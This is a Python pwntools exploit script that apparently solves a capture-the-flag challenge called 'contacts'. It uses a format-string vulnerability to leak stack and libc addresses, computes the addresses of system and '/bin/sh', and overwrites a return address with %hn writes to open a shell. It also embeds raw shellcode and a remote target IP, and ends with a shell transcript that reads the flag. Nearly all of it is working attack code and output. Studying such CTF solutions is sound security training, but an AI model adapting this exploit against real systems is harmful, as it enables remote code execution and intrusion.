#!/usr/bin/env python
from pwn import *
import binascii
import IPython

sys.stdout.flush = lambda *args, **kwargs: () # hack for IPython/pwntools integration

shellcode = binascii.unhexlify('b8d08c97ff83f0ff50b8d09d969183f0ff5089e331c931d231c0b00bcd80')

p = process('pwn/contacts_54f3188f64e548565bc1b87d7aa07427') if '--live' not in sys.argv else remote('54.165.223.128', 2555)

def add_contact(name, phone, descr):
    print(p.recvuntil(['>>> ']))
    p.sendline('1')
    print(p.recvuntil(['Name:']))
    p.sendline(name)
    print(p.recvuntil(['Enter Phone No:']))
    p.sendline(phone)
    print(p.recvuntil(['Length of description:']))
    p.sendline(str(len(descr)))
    print(p.recvuntil(['Enter description:']))
    p.sendline(descr)

def remove_contact(name):
    print(p.recvuntil(['>>> ']))
    p.sendline('2')
    print(p.recvuntil(['Name to remove?']))
    p.sendline(name)
    print(p.recvuntil(['Removed:']))

def edit_name(name, newname):
    print(p.recvuntil(['>>> ']))
    p.sendline('3')
    print(p.recvuntil(['Name to change?']))
    p.sendline(name)
    print(p.recvuntil(['>>> ']))
    p.sendline('1')
    print(p.recvuntil(['New name:']))
    p.sendline(newname)

def get_leak(num):
    print(p.recvuntil(['>>> ']))
    p.sendline('4')
    print(p.recvuntil(['Description: ']))
    s = p.recvregex(r'([0-9a-f]{8}\.){%d}' % (num,))
    return s

def poke_vuln():
    print(p.recvuntil(['>>> ']))
    p.sendline('4')
    print(p.recvuntil(['Contacts:']))
    print(p.recvuntil(['Name:']))
    print(p.recvuntil(['Phone #:']))
    print(p.recvuntil(['Description:']))

#b *0x08048c22
#gdb.attach(p)
'''
(gdb) x/32wx $esp
0xffb6b4d0: 0x090c4018  0x090c4008  0xf7611d5b  0xf776c000
0xffb6b4e0: 0x00000000  0x00000000  0xffb6b518  0x08048c99
0xffb6b4f0: 0x0804b0a8  0x00001388  0x090c4008  0x090c4018
0xffb6b500: 0xf776cac0  0x08048ed6  0x0804b0a0  0x00000000
0xffb6b510: 0x00000000  0xf776c000  0xffb6b548  0x080487a2
0xffb6b520: 0x0804b0a0  0xffb6b538  0x00000050  0x00000000
0xffb6b530: 0xf776c3c4  0xf7796000  0x00000004  0x0000000a
0xffb6b540: 0x08048df0  0x00000000  0x00000000  0xf75dea63
'''
'''
(gdb) x/64wx $esp
0xffc50af0: 0x08ecf018  0x08ecf008  0xf75b6d5b  0xf7711000
0xffc50b00: 0x00000000  0x00000000  0xffc50b38  0x08048c99
0xffc50b10: 0x0804b0a8  0x00001388  0x08ecf008  0x08ecf018
0xffc50b20: 0xf7711ac0  0x08048ed6  0x0804b0a0  0x00000000
0xffc50b30: 0x00000000  0xf7711000  0xffc50b68  0x080487a2
0xffc50b40: 0x0804b0a0  0xffc50b58  0x00000050  0x00000000
0xffc50b50: 0xf77113c4  0xf773b000  0x00000004  0x0000000a
0xffc50b60: 0x08048df0  0x00000000  0x00000000  0xf7583a63
0xffc50b70: 0x00000001  0xffc50c04  0xffc50c0c  0xf7728c7a
0xffc50b80: 0x00000001  0xffc50c04  0xffc50ba4  0x0804b034
0xffc50b90: 0x080482f8  0xf7711000  0x00000000  0x00000000
0xffc50ba0: 0x00000000  0x42d93e76  0x78bb9a67  0x00000000
0xffc50bb0: 0x00000000  0x00000000  0x00000001  0x080485c0
0xffc50bc0: 0x00000000  0xf772e4b0  0xf7583979  0xf773b000
0xffc50bd0: 0x00000001  0x080485c0  0x00000000  0x080485e1
0xffc50be0: 0x080486bd  0x00000001  0xffc50c04  0x08048df0
'''

num_leak = 1000
add_contact('leak', '1234', "%08x."*num_leak)
leak = [int(x, 16) for x in get_leak(num_leak).split('.')[:-1]]
print(leak)

#gdb.attach(p)
#IPython.embed()


'''
In [1]: map(hex, leak[0:10])
Out[1]:
['0x88b1008',
 '0xf75f3d5b',
 '0xf774e000',
 '0x0',
 '0x0',
 '0xffeb25c8',
 '0x8048c99',
 '0x804b0a8',
 '0x1388',
 '0x88b1008']
-----
[0x00019bc0]> f~sym.system
0x0003fcd0 56 sym.system
[0x00019bc0]> / /bin/sh
Searching 7 bytes from 0x00000174 to 0x001ab1d0: 2f 62 69 6e 2f 73 68
# 6 [0x174-0x1ab1d0]
hits: 1
0x0015da84 hit1_0 "/bin/sh"
-----
In [2]: system_addr = leak[1] - 0xf75f3d5b + 0xf75e6cd0
In [3]: binsh_addr = system_addr - 0x0003fcd0 + 0x0015da84
'''

system_addr = leak[1] - 0xf75f3d5b + 0xf75e6cd0
binsh_addr = system_addr - 0x0003fcd0 + 0x0015da84

print('%08x\n%08x' % (system_addr, binsh_addr))

remove_contact('leak')

# 0xffb6b4e0: 0x00000000  0x00000000  0xffb6b518  0x08048c99
target = leak[5] - 0xffb6b518 + 0xffb6b4e0 + (0xbdc - 0xb00) - 7*16
print('%08x' % (target,))

def overwrite_word(addr, value):
    add_contact('pwn', '1234', '%%%dx%%9$hn'%(value % 0x10000,))
    edit_name('pwn', 'pwn'+'\x00'*(0x40-3)+p32(addr))
    poke_vuln()
    remove_contact('pwn')

def overwrite_quad(addr, value):
    overwrite_word(addr+2, (value & 0xffff0000)>>16)
    overwrite_word(addr  , (value & 0x0000ffff))

overwrite_quad(target, system_addr)
overwrite_quad(target+8, binsh_addr)

print('%08x\n%08x' % (system_addr, binsh_addr))

#gdb.attach(p)
p.interactive()

'''
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> $ 5
Thanks for trying out the demo, sadly your contacts are now erased
$ whoami
ctf
$ ls -l
total 16
-rwxrwxr-x 1 ctf ctf 9716 Sep 18 19:38 contacts_54f3188f64e548565bc1b87d7aa07427
-rw-rw-r-- 1 ctf ctf   35 Sep 18 19:21 flag
$ cat flag
flag{f0rm47_s7r1ng5_4r3_fun_57uff}
'''
